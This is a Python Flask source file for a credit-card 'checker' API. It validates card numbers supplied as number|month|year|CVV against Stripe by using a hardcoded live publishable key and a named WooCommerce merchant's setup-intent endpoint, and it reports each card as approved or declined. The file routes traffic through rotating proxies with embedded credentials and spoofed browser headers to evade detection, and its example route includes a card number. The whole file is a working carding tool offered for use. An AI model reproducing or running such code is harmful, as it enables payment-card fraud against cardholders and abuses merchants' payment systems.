# app.py
from flask import Flask, request, jsonify
import requests
import re
import os
import random
import uuid
from datetime import datetime
from urllib.parse import urlparse
import logging

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Environment variables for sensitive data
STRIPE_PUBLIC_KEY = os.environ.get('STRIPE_PUBLIC_KEY', 'pk_live_51KRko2JqYWyFfgByqMLZrabF5QnEd3NY3j57vXcFfmkbXsM84noWXNl8ZtvNwsxu3HWFIB2AnvTjjhKDD2zlV40o00zSgONFxu')

# Proxies list
PROXIES = [
    "http://gbllzhtz:9ixc3prqnss9@23.95.150.145:6114",
    "http://gbllzhtz:9ixc3prqnss9@198.23.239.134:6540",
    "http://gbllzhtz:9ixc3prqnss9@31.59.20.176:6754",
    "http://gbllzhtz:9ixc3prqnss9@198.105.121.200:6462",
    "http://gbllzhtz:9ixc3prqnss9@142.111.48.253:7030"
]

def get_proxy():
    """Get a random proxy from the list"""
    return random.choice(PROXIES)

def parse_card_data(card_string):
    """Parse card data from the format: card_no|mm|yy|cvv or card_no|mm|yyyy|cvv"""
    parts = card_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid format. Use: card_no|mm|yy|cvv or card_no|mm|yyyy|cvv")
    
    card_no, month, year, cvv = parts
    
    # Clean and format card number (remove spaces and special characters)
    card_no = re.sub(r'\s+', '', card_no)
    card_no = re.sub(r'[^\d]', '', card_no)
    
    # Validate card number length
    if len(card_no) not in [15, 16]:
        raise ValueError("Invalid card number length")
    
    # Format year (if 4-digit, take last 2)
    if len(year) == 4:
        year = year[2:]
    elif len(year) != 2:
        raise ValueError("Year should be 2 or 4 digits")
    
    # Validate month
    if not month.isdigit() or not 1 <= int(month) <= 12:
        raise ValueError("Invalid month")
    
    # Ensure month is 2 digits
    month = month.zfill(2)
    
    # Validate CVV
    cvv = re.sub(r'[^\d]', '', cvv)
    if len(cvv) not in [3, 4]:
        raise ValueError("Invalid CVV length")
    
    return card_no, month, year, cvv

def format_card_number(card_no):
    """Format card number with spaces for display"""
    groups = []
    for i in range(0, len(card_no), 4):
        groups.append(card_no[i:i+4])
    return ' '.join(groups)

def validate_site(site):
    """Validate site domain"""
    if not re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', site):
        raise ValueError("Invalid site domain")
    return site

def make_request_with_proxy(url, method='POST', headers=None, data=None, cookies=None, retries=3):
    """Make request with proxy rotation and retries"""
    for attempt in range(retries):
        try:
            proxy = get_proxy()
            proxy_dict = {
                'http': proxy,
                'https': proxy
            }
            
            logger.info(f"Attempt {attempt + 1} using proxy: {proxy.split('@')[1] if '@' in proxy else proxy}")
            
            if method.upper() == 'POST':
                response = requests.post(
                    url,
                    headers=headers,
                    data=data,
                    cookies=cookies,
                    proxies=proxy_dict,
                    timeout=30,
                    verify=True
                )
            else:
                response = requests.get(
                    url,
                    headers=headers,
                    data=data,
                    cookies=cookies,
                    proxies=proxy_dict,
                    timeout=30,
                    verify=True
                )
            
            logger.info(f"Request successful with proxy, status: {response.status_code}")
            return response
            
        except requests.exceptions.ProxyError as e:
            logger.warning(f"Proxy error (attempt {attempt + 1}): {str(e)}")
            continue
        except requests.exceptions.Timeout as e:
            logger.warning(f"Timeout error (attempt {attempt + 1}): {str(e)}")
            continue
        except requests.exceptions.ConnectionError as e:
            logger.warning(f"Connection error (attempt {attempt + 1}): {str(e)}")
            continue
        except Exception as e:
            logger.error(f"Unexpected error (attempt {attempt + 1}): {str(e)}")
            continue
    
    # If all retries fail, try without proxy
    logger.warning("All proxy attempts failed, trying without proxy...")
    try:
        if method.upper() == 'POST':
            return requests.post(url, headers=headers, data=data, cookies=cookies, timeout=30, verify=True)
        else:
            return requests.get(url, headers=headers, data=data, cookies=cookies, timeout=30, verify=True)
    except Exception as e:
        logger.error(f"Request failed without proxy: {str(e)}")
        raise

def generate_dynamic_headers(site):
    """Generate dynamic headers with fresh values"""
    return {
        'authority': 'api.stripe.com',
        'accept': 'application/json',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
    }

@app.route('/gateway=stripeauth/site=<site>/cc=<card_data>', methods=['GET'])
def stripe_payment(site, card_data):
    try:
        logger.info(f"Processing request for site: {site}")
        
        # Validate site
        site = validate_site(site)
        
        # Parse card data
        card_no, month, year, cvv = parse_card_data(card_data)
        formatted_card = format_card_number(card_no)
        
        logger.info(f"Parsed card: {formatted_card[:8]}****{formatted_card[-4:]}")
        
        # Generate dynamic identifiers
        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        
        # Prepare Stripe data
        stripe_data = {
            'type': 'card',
            'card[number]': card_no,
            'card[cvc]': cvv,
            'card[exp_year]': year,
            'card[exp_month]': month,
            'allow_redisplay': 'unspecified',
            'billing_details[address][country]': 'IN',
            'payment_user_agent': 'stripe.js/6c35f76878; stripe-js-v3/6c35f76878; payment-element; deferred-intent',
            'referrer': f'https://{site}',
            'time_on_page': '32174',
            'client_attribution_metadata[client_session_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': str(uuid.uuid4()),
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'key': STRIPE_PUBLIC_KEY,
            '_stripe_version': '2024-06-20',
        }
        
        logger.info("Making Stripe API request...")
        
        # Make request to Stripe with proxy
        stripe_response = make_request_with_proxy(
            url='https://api.stripe.com/v1/payment_methods',
            method='POST',
            headers=generate_dynamic_headers(site),
            data=stripe_data
        )
        
        logger.info(f"Stripe response status: {stripe_response.status_code}")
        logger.info(f"Stripe response body (first 500 chars): {stripe_response.text[:500]}")
        
        if stripe_response.status_code != 200:
            logger.error(f"Stripe API error: {stripe_response.text}")
            return jsonify({
                'status': 'declined',
                'response': 'card was declined at stripe',
                'debug': {
                    'stripe_status': stripe_response.status_code,
                    'stripe_error': stripe_response.text[:200] if stripe_response.text else 'No error message'
                }
            }), 200

        stripe_data_response = stripe_response.json()
        payment_method_id = stripe_data_response.get('id')
        
        if not payment_method_id:
            logger.error(f"No payment method ID in response: {stripe_data_response}")
            return jsonify({
                'status': 'declined',
                'response': 'no payment method id received',
                'debug': stripe_data_response
            }), 200
        
        logger.info(f"Payment method ID obtained: {payment_method_id}")
        
        # Prepare site headers
        site_headers = {
            'authority': site,
            'accept': '*/*',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': f'https://{site}',
            'referer': f'https://{site}/my-account/add-payment-method/',
            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        
        site_data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_method_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': '7817991406',
        }
        
        logger.info("Making merchant site request...")
        
        # Make request to merchant site with proxy
        site_response = make_request_with_proxy(
            url=f'https://{site}/wp-admin/admin-ajax.php',
            method='POST',
            headers=site_headers,
            data=site_data
        )
        
        logger.info(f"Site response status: {site_response.status_code}")
        logger.info(f"Site response body (first 500 chars): {site_response.text[:500]}")
        
        # Parse site response
        try:
            site_response_json = site_response.json()
            response_str = str(site_response_json).lower()
            
            success_indicators = ['succeeded', 'active', 'true', 'paymentmethod', 'success', 'created']
            error_indicators = ['error', 'declined', 'failed', 'invalid', 'refused']
            
            if site_response.status_code == 200:
                if any(indicator in response_str for indicator in success_indicators):
                    logger.info("Payment successful!")
                    return jsonify({
                        'status': 'approved',
                        'response': 'payment method added successfully',
                        'debug': {
                            'site_status': site_response.status_code,
                            'site_response': site_response_json
                        }
                    }), 200
                elif any(indicator in response_str for indicator in error_indicators):
                    logger.warning(f"Payment declined by merchant: {response_str[:100]}")
                    return jsonify({
                        'status': 'declined',
                        'response': 'card was declined by merchant',
                        'debug': {
                            'site_status': site_response.status_code,
                            'site_response': site_response_json
                        }
                    }), 200
                else:
                    # If we have a 200 but unclear response, check for specific patterns
                    if 'id' in site_response_json or 'client_secret' in site_response_json:
                        logger.info("Payment likely successful (contains ID or client_secret)")
                        return jsonify({
                            'status': 'approved',
                            'response': 'payment method added successfully',
                            'debug': {
                                'site_status': site_response.status_code,
                                'site_response': 'contains id or client_secret'
                            }
                        }), 200
                    else:
                        logger.warning(f"Unclear response: {response_str[:100]}")
                        return jsonify({
                            'status': 'declined',
                            'response': 'unclear response from merchant',
                            'debug': {
                                'site_status': site_response.status_code,
                                'site_response': site_response_json
                            }
                        }), 200
            else:
                logger.error(f"Merchant returned non-200 status: {site_response.status_code}")
                return jsonify({
                    'status': 'declined',
                    'response': f'merchant returned status {site_response.status_code}',
                    'debug': {
                        'site_status': site_response.status_code,
                        'site_response': site_response.text[:200] if site_response.text else 'Empty response'
                    }
                }), 200
                
        except ValueError as e:
            # Non-JSON response
            logger.warning(f"Non-JSON response from site: {e}")
            if site_response.status_code == 200 and site_response.text:
                # Check for success indicators in plain text
                response_text = site_response.text.lower()
                if any(indicator in response_text for indicator in ['success', 'succeeded', 'created']):
                    logger.info("Payment successful (non-JSON)")
                    return jsonify({
                        'status': 'approved',
                        'response': 'payment method added successfully',
                        'debug': {
                            'site_status': site_response.status_code,
                            'site_response_type': 'non-json',
                            'response_preview': site_response.text[:100]
                        }
                    }), 200
            
            logger.error(f"Could not parse site response: {site_response.text[:200]}")
            return jsonify({
                'status': 'declined',
                'response': 'unable to parse merchant response',
                'debug': {
                    'site_status': site_response.status_code,
                    'site_response': site_response.text[:200] if site_response.text else 'Empty response'
                }
            }), 200

    except ValueError as e:
        logger.error(f"Validation error: {str(e)}")
        return jsonify({
            'status': 'declined',
            'response': f'validation error: {str(e)}'
        }), 200
    except requests.exceptions.Timeout as e:
        logger.error(f"Request timeout: {str(e)}")
        return jsonify({
            'status': 'declined',
            'response': 'request timeout'
        }), 200
    except requests.exceptions.ConnectionError as e:
        logger.error(f"Connection error: {str(e)}")
        return jsonify({
            'status': 'declined',
            'response': 'connection error'
        }), 200
    except Exception as e:
        logger.error(f"Unexpected error: {str(e)}", exc_info=True)
        return jsonify({
            'status': 'declined',
            'response': f'server error: {str(e)}'
        }), 200

@app.route('/test-proxy', methods=['GET'])
def test_proxy():
    """Test endpoint to check if proxies are working"""
    try:
        test_url = "https://httpbin.org/ip"
        
        for i, proxy in enumerate(PROXIES):
            try:
                proxy_dict = {'http': proxy, 'https': proxy}
                response = requests.get(test_url, proxies=proxy_dict, timeout=10)
                
                # Extract IP from proxy URL for display
                proxy_ip = proxy.split('@')[1].split(':')[0] if '@' in proxy else proxy.split(':')[1].replace('//', '')
                
                return jsonify({
                    'status': 'success',
                    'message': 'Proxies are working',
                    'proxy_tested': proxy_ip,
                    'response': response.json(),
                    'total_proxies': len(PROXIES)
                })
            except Exception as e:
                continue
        
        # Test without proxy
        response = requests.get(test_url, timeout=10)
        return jsonify({
            'status': 'warning',
            'message': 'Proxies failed, using direct connection',
            'response': response.json()
        })
        
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': f'Proxy test failed: {str(e)}'
        }), 500

@app.route('/')
def index():
    return jsonify({
        'message': 'Stripe Payment Gateway API with Proxy Support',
        'usage': 'GET /gateway=stripeauth/site=<site>/cc=<card_no|mm|yy|cvv>',
        'example': '/gateway=stripeauth/site=bookshop.multilit.com/cc=5403856014744764|04|26|579',
        'endpoints': {
            'main': '/gateway=stripeauth/site=<site>/cc=<card_data>',
            'test_proxies': '/test-proxy',
            'health': '/health'
        },
        'proxy_support': 'Enabled with rotation',
        'total_proxies': len(PROXIES),
        'environment': 'production' if not os.environ.get('VERCEL') else 'vercel'
    })

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat(),
        'proxy_count': len(PROXIES)
    }), 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 2000))
    logger.info(f"Starting server on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False)